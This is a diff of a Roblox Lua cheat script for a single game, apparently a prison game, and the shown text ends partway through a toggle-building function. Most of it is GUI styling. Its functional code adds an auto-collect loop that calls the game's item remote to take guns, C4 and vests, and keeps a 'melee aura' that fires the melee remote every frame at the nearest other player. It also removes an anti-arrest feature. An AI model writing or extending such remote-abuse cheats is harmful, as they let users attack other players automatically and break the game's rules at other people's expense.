@@ -6,7 +6,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
 
 if game.PlaceId ~= 155615604 then
-    return
+   return
 end
 
 local LocalPlayer = Players.LocalPlayer
@@ -20,24 +20,77 @@ local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
 local savedPosition = nil
 local meleeAuraEnabled = false
 local antiTaseEnabled = false
-local antiArrestEnabled = false
 local auraConnection = nil
-local arrestConnection = nil
-local ammoConnection = nil
-local collectConnection = nil
 
 local AURA_WHITELIST = {
-    [10832085518] = true,
-    [8616490754] = true,
+   [10832085518] = true,
+   [8616490754] = true,
 }
 
-local ARREST_WHITELIST = {
-    ["ikoszx"] = true,
-    ["ketenimwryy"] = true,
+local AUTO_COLLECT_ITEMS = {
+   {
+       path = {"Prison_ITEMS", "giver", "M700", "model2"},
+       remote = "InteractWithItem",
+       fireType = "InvokeServer",
+   },
+   {
+       path = {"Prison_ITEMS", "giver", "AK-47", "Meshes/AK47_7"},
+       remote = "InteractWithItem",
+       fireType = "InvokeServer",
+   },
+   {
+       path = {"Prison_ITEMS", "giver", "Remington 870", "Meshes/r870_2"},
+       remote = "InteractWithItem",
+       fireType = "InvokeServer",
+   },
+   {
+       path = {"Prison_ITEMS", "giver", "MP5", "Meshes/MP5 (2)"},
+       remote = "InteractWithItem",
+       fireType = "InvokeServer",
+   },
+   {
+       path = {"Prison_ITEMS", "giver", "C4 Explosive", "Explosive"},
+       remote = "InteractWithItem",
+       fireType = "InvokeServer",
+   },
+   {
+       path = {"Prison_ITEMS", "giver", "Revolver", "Meshes/revolver (3)"},
+       remote = "InteractWithItem",
+       fireType = "InvokeServer",
+   },
+   {
+       path = {"Prison_ITEMS", "clothes", "Mafia", "Meshes/vest (7)"},
+       remote = "InteractWithItem",
+       fireType = "InvokeServer",
+   },
+   {
+       path = {"Prison_ITEMS", "clothes", "Light Vest", "Torso"},
+       remote = "InteractWithItem",
+       fireType = "InvokeServer",
+   },
 }
 
 local function IsAuraWhitelisted(userId)
-    return AURA_WHITELIST[userId] == true
+   return AURA_WHITELIST[userId] == true
+end
+
+local function AutoCollectLoop()
+   for _, itemData in ipairs(AUTO_COLLECT_ITEMS) do
+       pcall(function()
+           local current = Workspace
+           for _, pathPart in ipairs(itemData.path) do
+               current = current:FindFirstChild(pathPart)
+               if not current then return end
+           end
+           local args = {current}
+           local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(itemData.remote)
+           if itemData.fireType == "InvokeServer" then
+               remote:InvokeServer(unpack(args))
+           else
+               remote:FireServer(unpack(args))
+           end
+       end)
+   end
 end
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -74,14 +127,14 @@ GlassStroke.Parent = MainFrame
 
 local GlassGradient = Instance.new("UIGradient")
 GlassGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 200, 200)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+   ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 200, 200)),
+   ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
 })
 GlassGradient.Transparency = NumberSequence.new({
-    NumberSequenceKeypoint.new(0, 0.85),
-    NumberSequenceKeypoint.new(0.5, 0.92),
-    NumberSequenceKeypoint.new(1, 0.85)
+   NumberSequenceKeypoint.new(0, 0.85),
+   NumberSequenceKeypoint.new(0.5, 0.92),
+   NumberSequenceKeypoint.new(1, 0.85)
 })
 GlassGradient.Rotation = 45
 GlassGradient.Parent = MainFrame
@@ -98,29 +151,29 @@ ShimmerFrame.Parent = MainFrame
 
 local ShimmerGradient = Instance.new("UIGradient")
 ShimmerGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+   ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(0.3, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(0.7, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
 })
 ShimmerGradient.Transparency = NumberSequence.new({
-    NumberSequenceKeypoint.new(0, 1),
-    NumberSequenceKeypoint.new(0.3, 1),
-    NumberSequenceKeypoint.new(0.5, 0.75),
-    NumberSequenceKeypoint.new(0.7, 1),
-    NumberSequenceKeypoint.new(1, 1)
+   NumberSequenceKeypoint.new(0, 1),
+   NumberSequenceKeypoint.new(0.3, 1),
+   NumberSequenceKeypoint.new(0.5, 0.75),
+   NumberSequenceKeypoint.new(0.7, 1),
+   NumberSequenceKeypoint.new(1, 1)
 })
 ShimmerGradient.Rotation = 90
 ShimmerGradient.Parent = ShimmerFrame
 
 RunService.RenderStepped:Connect(function()
-    ShimmerFrame.Position = UDim2.new(
-        -0.5 + (math.sin(tick() * 0.8) * 0.5 + 0.5) * 1,
-        0,
-        -0.5,
-        0
-    )
+   ShimmerFrame.Position = UDim2.new(
+       -0.5 + (math.sin(tick() * 0.8) * 0.5 + 0.5) * 1,
+       0,
+       -0.5,
+       0
+   )
 end)
 
 local CloseButton = Instance.new("TextButton")
@@ -165,14 +218,14 @@ MiniBarStroke.Parent = MiniBar
 
 local MiniBarGradient = Instance.new("UIGradient")
 MiniBarGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 200, 200)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+   ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 200, 200)),
+   ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
 })
 MiniBarGradient.Transparency = NumberSequence.new({
-    NumberSequenceKeypoint.new(0, 0.85),
-    NumberSequenceKeypoint.new(0.5, 0.92),
-    NumberSequenceKeypoint.new(1, 0.85)
+   NumberSequenceKeypoint.new(0, 0.85),
+   NumberSequenceKeypoint.new(0.5, 0.92),
+   NumberSequenceKeypoint.new(1, 0.85)
 })
 MiniBarGradient.Rotation = 45
 MiniBarGradient.Parent = MiniBar
@@ -188,29 +241,29 @@ MiniBarShimmer.Parent = MiniBar
 
 local MiniBarShimmerGrad = Instance.new("UIGradient")
 MiniBarShimmerGrad.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(0.7, Color3.fromRGB(255, 255, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+   ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(0.3, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(0.7, Color3.fromRGB(255, 255, 255)),
+   ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
 })
 MiniBarShimmerGrad.Transparency = NumberSequence.new({
-    NumberSequenceKeypoint.new(0, 1),
-    NumberSequenceKeypoint.new(0.3, 1),
-    NumberSequenceKeypoint.new(0.5, 0.75),
-    NumberSequenceKeypoint.new(0.7, 1),
-    NumberSequenceKeypoint.new(1, 1)
+   NumberSequenceKeypoint.new(0, 1),
+   NumberSequenceKeypoint.new(0.3, 1),
+   NumberSequenceKeypoint.new(0.5, 0.75),
+   NumberSequenceKeypoint.new(0.7, 1),
+   NumberSequenceKeypoint.new(1, 1)
 })
 MiniBarShimmerGrad.Rotation = 90
 MiniBarShimmerGrad.Parent = MiniBarShimmer
 
 RunService.RenderStepped:Connect(function()
-    MiniBarShimmer.Position = UDim2.new(
-        -0.5 + (math.sin(tick() * 0.8) * 0.5 + 0.5) * 1,
-        0,
-        -0.5,
-        0
-    )
+   MiniBarShimmer.Position = UDim2.new(
+       -0.5 + (math.sin(tick() * 0.8) * 0.5 + 0.5) * 1,
+       0,
+       -0.5,
+       0
+   )
 end)
 
 local MiniStatusDot = Instance.new("Frame")
@@ -235,51 +288,51 @@ MiniLabel.TextXAlignment = Enum.TextXAlignment.Center
 MiniLabel.Parent = MiniBar
 
 local function OpenMiniBar()
-    MiniBar.Visible = true
-    MiniBar.Size = UDim2.new(0, 0, 0, 30)
-    MiniBar.ClipsDescendants = true
-    TweenService:Create(MiniBar, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-        Size = UDim2.new(0, 110, 0, 30)
-    }):Play()
+   MiniBar.Visible = true
+   MiniBar.Size = UDim2.new(0, 0, 0, 30)
+   MiniBar.ClipsDescendants = true
+   TweenService:Create(MiniBar, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+       Size = UDim2.new(0, 110, 0, 30)
+   }):Play()
 end
 
 local function CloseMiniBar()
-    local t = TweenService:Create(MiniBar, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-        Size = UDim2.new(0, 0, 0, 30)
-    })
-    t:Play()
-    t.Completed:Wait()
-    MiniBar.Visible = false
+   local t = TweenService:Create(MiniBar, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+       Size = UDim2.new(0, 0, 0, 30)
+   })
+   t:Play()
+   t.Completed:Wait()
+   MiniBar.Visible = false
 end
 
 local function OpenMainGui()
-    MainFrame.Visible = true
-    MainFrame.Size = UDim2.new(0, 0, 0, 0)
-    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-    MainFrame.BackgroundTransparency = 1
-    TweenService:Create(MainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-        Size = UDim2.new(0, 220, 0, 272),
-        Position = UDim2.new(0.5, -110, 0.5, -136),
-        BackgroundTransparency = 0.15
-    }):Play()
+   MainFrame.Visible = true
+   MainFrame.Size = UDim2.new(0, 0, 0, 0)
+   MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+   MainFrame.BackgroundTransparency = 1
+   TweenService:Create(MainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+       Size = UDim2.new(0, 220, 0, 272),
+       Position = UDim2.new(0.5, -110, 0.5, -136),
+       BackgroundTransparency = 0.15
+   }):Play()
 end
 
 MiniLabel.MouseButton1Click:Connect(function()
-    CloseMiniBar()
-    task.wait(0.1)
-    OpenMainGui()
+   CloseMiniBar()
+   task.wait(0.1)
+   OpenMainGui()
 end)
 
 CloseButton.MouseButton1Click:Connect(function()
-    local closeTween = TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-        Size = UDim2.new(0, 0, 0, 0),
-        Position = UDim2.new(0.5, 0, 0.5, 0),
-        BackgroundTransparency = 1
-    })
-    closeTween:Play()
-    closeTween.Completed:Wait()
-    MainFrame.Visible = false
-    OpenMiniBar()
+   local closeTween = TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+       Size = UDim2.new(0, 0, 0, 0),
+       Position = UDim2.new(0.5, 0, 0.5, 0),
+       BackgroundTransparency = 1
+   })
+   closeTween:Play()
+   closeTween.Completed:Wait()
+   MainFrame.Visible = false
+   OpenMiniBar()
 end)
 
 local TitleLabel = Instance.new("TextLabel")
@@ -326,545 +379,443 @@ ContentContainer.BorderSizePixel = 0
 ContentContainer.Parent = MainFrame
 
 local openTween = TweenService:Create(MainFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-    Size = UDim2.new(0, 220, 0, 272),
-    Position = UDim2.new(0.5, -110, 0.5, -136),
-    BackgroundTransparency = 0.15
+   Size = UDim2.new(0, 220, 0, 272),
+   Position = UDim2.new(0.5, -110, 0.5, -136),
+   BackgroundTransparency = 0.15
 })
 openTween:Play()
 
 local activeNotifications = {}
 
 local function ShowNotification(title, message, duration)
-    duration = duration or 3
+   duration = duration or 3
 
-    local notifFrame = Instance.new("Frame")
-    notifFrame.Name = "Notification"
-    notifFrame.Size = UDim2.new(0, 260, 0, 70)
-    notifFrame.Position = UDim2.new(1, 20, 0, -90)
-    notifFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    notifFrame.BackgroundTransparency = 0.1
-    notifFrame.BorderSizePixel = 0
-    notifFrame.ClipsDescendants = true
-    notifFrame.Parent = NotificationGui
+   local notifFrame = Instance.new("Frame")
+   notifFrame.Name = "Notification"
+   notifFrame.Size = UDim2.new(0, 260, 0, 70)
+   notifFrame.Position = UDim2.new(1, 20, 0, -90)
+   notifFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+   notifFrame.BackgroundTransparency = 0.1
+   notifFrame.BorderSizePixel = 0
+   notifFrame.ClipsDescendants = true
+   notifFrame.Parent = NotificationGui
 
-    local notifCorner = Instance.new("UICorner")
-    notifCorner.CornerRadius = UDim.new(0, 16)
-    notifCorner.Parent = notifFrame
+   local notifCorner = Instance.new("UICorner")
+   notifCorner.CornerRadius = UDim.new(0, 16)
+   notifCorner.Parent = notifFrame
 
-    local notifStroke = Instance.new("UIStroke")
-    notifStroke.Color = Color3.fromRGB(255, 255, 255)
-    notifStroke.Transparency = 0.6
-    notifStroke.Thickness = 1
-    notifStroke.Parent = notifFrame
+   local notifStroke = Instance.new("UIStroke")
+   notifStroke.Color = Color3.fromRGB(255, 255, 255)
+   notifStroke.Transparency = 0.6
+   notifStroke.Thickness = 1
+   notifStroke.Parent = notifFrame
 
-    local notifGradient = Instance.new("UIGradient")
-    notifGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 200, 200)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
-    })
-    notifGradient.Transparency = NumberSequence.new({
-        NumberSequenceKeypoint.new(0, 0.88),
-        NumberSequenceKeypoint.new(0.5, 0.93),
-        NumberSequenceKeypoint.new(1, 0.88)
-    })
-    notifGradient.Rotation = 45
-    notifGradient.Parent = notifFrame
+   local notifGradient = Instance.new("UIGradient")
+   notifGradient.Color = ColorSequence.new({
+       ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+       ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 200, 200)),
+       ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+   })
+   notifGradient.Transparency = NumberSequence.new({
+       NumberSequenceKeypoint.new(0, 0.88),
+       NumberSequenceKeypoint.new(0.5, 0.93),
+       NumberSequenceKeypoint.new(1, 0.88)
+   })
+   notifGradient.Rotation = 45
+   notifGradient.Parent = notifFrame
 
-    local notifShimmer = Instance.new("Frame")
-    notifShimmer.Size = UDim2.new(2, 0, 2, 0)
-    notifShimmer.Position = UDim2.new(-0.5, 0, -0.5, 0)
-    notifShimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    notifShimmer.BackgroundTransparency = 0.95
-    notifShimmer.BorderSizePixel = 0
-    notifShimmer.Rotation = -45
-    notifShimmer.Parent = notifFrame
+   local notifShimmer = Instance.new("Frame")
+   notifShimmer.Size = UDim2.new(2, 0, 2, 0)
+   notifShimmer.Position = UDim2.new(-0.5, 0, -0.5, 0)
+   notifShimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+   notifShimmer.BackgroundTransparency = 0.95
+   notifShimmer.BorderSizePixel = 0
+   notifShimmer.Rotation = -45
+   notifShimmer.Parent = notifFrame
 
-    local notifShimmerGrad = Instance.new("UIGradient")
-    notifShimmerGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
-    })
-    notifShimmerGrad.Transparency = NumberSequence.new({
-        NumberSequenceKeypoint.new(0, 1),
-        NumberSequenceKeypoint.new(0.3, 1),
-        NumberSequenceKeypoint.new(0.5, 0.78),
-        NumberSequenceKeypoint.new(0.7, 1),
-        NumberSequenceKeypoint.new(1, 1)
-    })
-    notifShimmerGrad.Rotation = 90
-    notifShimmerGrad.Parent = notifShimmer
+   local notifShimmerGrad = Instance.new("UIGradient")
+   notifShimmerGrad.Color = ColorSequence.new({
+       ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
+       ColorSequenceKeypoint.new(0.3, Color3.fromRGB(255, 255, 255)),
+       ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
+       ColorSequenceKeypoint.new(0.7, Color3.fromRGB(255, 255, 255)),
+       ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
+   })
+   notifShimmerGrad.Transparency = NumberSequence.new({
+       NumberSequenceKeypoint.new(0, 1),
+       NumberSequenceKeypoint.new(0.3, 1),
+       NumberSequenceKeypoint.new(0.5, 0.78),
+       NumberSequenceKeypoint.new(0.7, 1),
+       NumberSequenceKeypoint.new(1, 1)
+   })
+   notifShimmerGrad.Rotation = 90
+   notifShimmerGrad.Parent = notifShimmer
 
-    RunService.RenderStepped:Connect(function()
-        notifShimmer.Position = UDim2.new(
-            -0.5 + (math.sin(tick() * 1.2) * 0.5 + 0.5) * 1,
-            0,
-            -0.5,
-            0
-        )
-    end)
+   RunService.RenderStepped:Connect(function()
+       notifShimmer.Position = UDim2.new(
+           -0.5 + (math.sin(tick() * 1.2) * 0.5 + 0.5) * 1,
+           0,
+           -0.5,
+           0
+       )
+   end)
 
-    local notifTitle = Instance.new("TextLabel")
-    notifTitle.Size = UDim2.new(1, -20, 0, 22)
-    notifTitle.Position = UDim2.new(0, 14, 0, 10)
-    notifTitle.BackgroundTransparency = 1
-    notifTitle.Text = title
-    notifTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-    notifTitle.TextSize = 14
-    notifTitle.Font = Enum.Font.GothamBold
-    notifTitle.TextXAlignment = Enum.TextXAlignment.Left
-    notifTitle.TextYAlignment = Enum.TextYAlignment.Center
-    notifTitle.Parent = notifFrame
+   local notifTitle = Instance.new("TextLabel")
+   notifTitle.Size = UDim2.new(1, -20, 0, 22)
+   notifTitle.Position = UDim2.new(0, 14, 0, 10)
+   notifTitle.BackgroundTransparency = 1
+   notifTitle.Text = title
+   notifTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+   notifTitle.TextSize = 14
+   notifTitle.Font = Enum.Font.GothamBold
+   notifTitle.TextXAlignment = Enum.TextXAlignment.Left
+   notifTitle.TextYAlignment = Enum.TextYAlignment.Center
+   notifTitle.Parent = notifFrame
 
-    local notifMessage = Instance.new("TextLabel")
-    notifMessage.Size = UDim2.new(1, -20, 0, 30)
-    notifMessage.Position = UDim2.new(0, 14, 0, 32)
-    notifMessage.BackgroundTransparency = 1
-    notifMessage.Text = message
-    notifMessage.TextColor3 = Color3.fromRGB(180, 180, 180)
-    notifMessage.TextSize = 11
-    notifMessage.Font = Enum.Font.Gotham
-    notifMessage.TextXAlignment = Enum.TextXAlignment.Left
-    notifMessage.TextYAlignment = Enum.TextYAlignment.Top
-    notifMessage.TextWrapped = true
-    notifMessage.Parent = notifFrame
+   local notifMessage = Instance.new("TextLabel")
+   notifMessage.Size = UDim2.new(1, -20, 0, 30)
+   notifMessage.Position = UDim2.new(0, 14, 0, 32)
+   notifMessage.BackgroundTransparency = 1
+   notifMessage.Text = message
+   notifMessage.TextColor3 = Color3.fromRGB(180, 180, 180)
+   notifMessage.TextSize = 11
+   notifMessage.Font = Enum.Font.Gotham
+   notifMessage.TextXAlignment = Enum.TextXAlignment.Left
+   notifMessage.TextYAlignment = Enum.TextYAlignment.Top
+   notifMessage.TextWrapped = true
+   notifMessage.Parent = notifFrame
 
-    table.insert(activeNotifications, 1, notifFrame)
+   table.insert(activeNotifications, 1, notifFrame)
 
-    for i, notif in ipairs(activeNotifications) do
-        TweenService:Create(notif, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-            Position = UDim2.new(1, -280, 0, 20 + (i - 1) * 80)
-        }):Play()
-    end
+   for i, notif in ipairs(activeNotifications) do
+       TweenService:Create(notif, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+           Position = UDim2.new(1, -280, 0, 20 + (i - 1) * 80)
+       }):Play()
+   end
 
-    TweenService:Create(notifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-        Position = UDim2.new(1, -280, 0, 20)
-    }):Play()
+   TweenService:Create(notifFrame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+       Position = UDim2.new(1, -280, 0, 20)
+   }):Play()
 
-    task.delay(duration, function()
-        TweenService:Create(notifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-            Position = UDim2.new(1, 20, 0, notifFrame.Position.Y.Offset),
-            BackgroundTransparency = 1
-        }):Play()
+   task.delay(duration, function()
+       TweenService:Create(notifFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+           Position = UDim2.new(1, 20, 0, notifFrame.Position.Y.Offset),
+           BackgroundTransparency = 1
+       }):Play()
 
-        for _, child in ipairs(notifFrame:GetDescendants()) do
-            if child:IsA("TextLabel") then
-                TweenService:Create(child, TweenInfo.new(0.3), {
-                    TextTransparency = 1
-                }):Play()
-            elseif child:IsA("UIStroke") then
-                TweenService:Create(child, TweenInfo.new(0.3), {
-                    Transparency = 1
-                }):Play()
-            end
-        end
+       for _, child in ipairs(notifFrame:GetDescendants()) do
+           if child:IsA("TextLabel") then
+               TweenService:Create(child, TweenInfo.new(0.3), {
+                   TextTransparency = 1
+               }):Play()
+           elseif child:IsA("UIStroke") then
+               TweenService:Create(child, TweenInfo.new(0.3), {
+                   Transparency = 1
+               }):Play()
+           end
+       end
 
-        task.wait(0.35)
-        notifFrame:Destroy()
+       task.wait(0.35)
+       notifFrame:Destroy()
 
-        for i, notif in ipairs(activeNotifications) do
-            if notif == notifFrame then
-                table.remove(activeNotifications, i)
-                break
-            end
-        end
+       for i, notif in ipairs(activeNotifications) do
+           if notif == notifFrame then
+               table.remove(activeNotifications, i)
+               break
+           end
+       end
 
-        for i, notif in ipairs(activeNotifications) do
-            TweenService:Create(notif, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-                Position = UDim2.new(1, -280, 0, 20 + (i - 1) * 80)
-            }):Play()
-        end
-    end)
+       for i, notif in ipairs(activeNotifications) do
+           TweenService:Create(notif, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+               Position = UDim2.new(1, -280, 0, 20 + (i - 1) * 80)
+           }):Play()
+       end
+   end)
 end
 
 local function GetClosestPlayer()
-    local closestPlayer = nil
-    local closestDistance = math.huge
+   local closestPlayer = nil
+   local closestDistance = math.huge
 
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character then
-            if IsAuraWhitelisted(player.UserId) then
-                continue
-            end
-            local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
-            local targetHumanoid = player.Character:FindFirstChild("Humanoid")
-            if targetHRP and targetHumanoid and targetHumanoid.Health > 0 then
-                local distance = (HumanoidRootPart.Position - targetHRP.Position).Magnitude
-                if distance <= 20 and distance < closestDistance then
-                    closestDistance = distance
-                    closestPlayer = player
-                end
-            end
-        end
-    end
-    return closestPlayer
+   for _, player in ipairs(Players:GetPlayers()) do
+       if player ~= LocalPlayer and player.Character then
+           if IsAuraWhitelisted(player.UserId) then
+               continue
+           end
+           local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
+           local targetHumanoid = player.Character:FindFirstChild("Humanoid")
+           if targetHRP and targetHumanoid and targetHumanoid.Health > 0 then
+               local distance = (HumanoidRootPart.Position - targetHRP.Position).Magnitude
+               if distance <= 20 and distance < closestDistance then
+                   closestDistance = distance
+                   closestPlayer = player
+               end
+           end
+       end
+   end
+   return closestPlayer
 end
 
 local function FireMelee(targetPlayer)
-    if not targetPlayer or not targetPlayer.Character then return end
-    local targetHumanoid = targetPlayer.Character:FindFirstChild("Humanoid")
-    if not targetHumanoid or targetHumanoid.Health <= 0 then return end
+   if not targetPlayer or not targetPlayer.Character then return end
+   local targetHumanoid = targetPlayer.Character:FindFirstChild("Humanoid")
+   if not targetHumanoid or targetHumanoid.Health <= 0 then return end
 
-    local args = {
-        targetPlayer,
-        1,
-        1
-    }
-    ReplicatedStorage:WaitForChild("meleeEvent"):FireServer(unpack(args))
+   local args = {
+       targetPlayer,
+       1,
+       1
+   }
+   ReplicatedStorage:WaitForChild("meleeEvent"):FireServer(unpack(args))
 end
 
 local function StartMeleeAura()
-    if auraConnection then auraConnection:Disconnect() end
-    auraConnection = RunService.Heartbeat:Connect(function()
-        if not meleeAuraEnabled then return end
-        local target = GetClosestPlayer()
-        if target then
-            FireMelee(target)
-        end
-    end)
+   if auraConnection then auraConnection:Disconnect() end
+   auraConnection = RunService.Heartbeat:Connect(function()
+       if not meleeAuraEnabled then return end
+       local target = GetClosestPlayer()
+       if target then
+           FireMelee(target)
+       end
+   end)
 end
 
 local function StopMeleeAura()
-    if auraConnection then
-        auraConnection:Disconnect()
-        auraConnection = nil
-    end
+   if auraConnection then
+       auraConnection:Disconnect()
+       auraConnection = nil
+   end
 end
 
 local function CreateToggle(name, positionY, callback)
-    local ToggleFrame = Instance.new("Frame")
-    ToggleFrame.Name = name .. "Toggle"
-    ToggleFrame.Size = UDim2.new(1, 0, 0, 34)
-    ToggleFrame.Position = UDim2.new(0, 0, 0, positionY)
-    ToggleFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-    ToggleFrame.BackgroundTransparency = 0.35
-    ToggleFrame.BorderSizePixel = 0
-    ToggleFrame.Parent = ContentContainer
+   local ToggleFrame = Instance.new("Frame")
+   ToggleFrame.Name = name .. "Toggle"
+   ToggleFrame.Size = UDim2.new(1, 0, 0, 34)
+   ToggleFrame.Position = UDim2.new(0, 0, 0, positionY)
+   ToggleFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+   ToggleFrame.BackgroundTransparency = 0.35
+   ToggleFrame.BorderSizePixel = 0
+   ToggleFrame.Parent = ContentContainer
 
-    local ToggleCorner = Instance.new("UICorner")
-    ToggleCorner.CornerRadius = UDim.new(0, 10)
-    ToggleCorner.Parent = ToggleFrame
+   local ToggleCorner = Instance.new("UICorner")
+   ToggleCorner.CornerRadius = UDim.new(0, 10)
+   ToggleCorner.Parent = ToggleFrame
 
-    local ToggleStroke = Instance.new("UIStroke")
-    ToggleStroke.Color = Color3.fromRGB(255, 255, 255)
-    ToggleStroke.Transparency = 0.75
-    ToggleStroke.Thickness = 1
-    ToggleStroke.Parent = ToggleFrame
+   local ToggleStroke = Instance.new("UIStroke")
+   ToggleStroke.Color = Color3.fromRGB(255, 255, 255)
+   ToggleStroke.Transparency = 0.75
+   ToggleStroke.Thickness = 1
+   ToggleStroke.Parent = ToggleFrame
 
-    local ToggleLabel = Instance.new("TextLabel")
-    ToggleLabel.Name = "Label"
-    ToggleLabel.Size = UDim2.new(0, 110, 1, 0)
-    ToggleLabel.Position = UDim2.new(0, 10, 0, 0)
-    ToggleLabel.BackgroundTransparency = 1
-    ToggleLabel.Text = name
-    ToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    ToggleLabel.TextSize = 12
-    ToggleLabel.Font = Enum.Font.GothamSemibold
-    ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
-    ToggleLabel.TextYAlignment = Enum.TextYAlignment.Center
-    ToggleLabel.Parent = ToggleFrame
+   local ToggleLabel = Instance.new("TextLabel")
+   ToggleLabel.Name = "Label"
+   ToggleLabel.Size = UDim2.new(0, 110, 1, 0)
+   ToggleLabel.Position = UDim2.new(0, 10, 0, 0)
+   ToggleLabel.BackgroundTransparency = 1
+   ToggleLabel.Text = name
+   ToggleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+   ToggleLabel.TextSize = 12
+   ToggleLabel.Font = Enum.Font.GothamSemibold
+   ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
+   ToggleLabel.TextYAlignment = Enum.TextYAlignment.Center
+   ToggleLabel.Parent = ToggleFrame
 
-    local SwitchContainer = Instance.new("Frame")
-    SwitchContainer.Name = "SwitchContainer"
-    SwitchContainer.Size = UDim2.new(0, 38, 0, 20)
-    SwitchContainer.Position = UDim2.new(1, -48, 0.5, -10)
